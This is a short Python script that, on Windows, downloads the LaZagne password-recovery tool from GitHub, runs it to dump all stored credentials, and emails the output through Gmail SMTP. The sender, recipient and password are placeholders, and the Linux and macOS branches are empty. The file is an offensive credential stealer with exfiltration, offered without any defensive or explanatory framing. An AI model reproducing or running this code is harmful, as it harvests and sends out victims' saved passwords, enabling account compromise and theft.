import requests, platform, subprocess, smtplib, re


def download(url):
    get_response = requests.get(url)
    file_name = url.split('/')[-1]
    with open(file_name, 'wb') as file:
        file.write(get_response.content)


def send_email(sender_mail, reciever_mail, password, mail_content):
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(sender_mail, password)
    server.sendmail(from_addr=sender_mail, to_addrs=reciever_mail, msg=mail_content)
    server.quit()


os_name = platform.system()

if os_name == "Windows":

    download('https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.5/LaZagne.exe')

    result = subprocess.check_output('laZagne.exe all', shell=True)

    print(result)

    send_email('mail', 'mail', 'password', result)


elif os_name == "Linux":
    pass

elif os_name == "Darwin":
    pass

else:
    pass
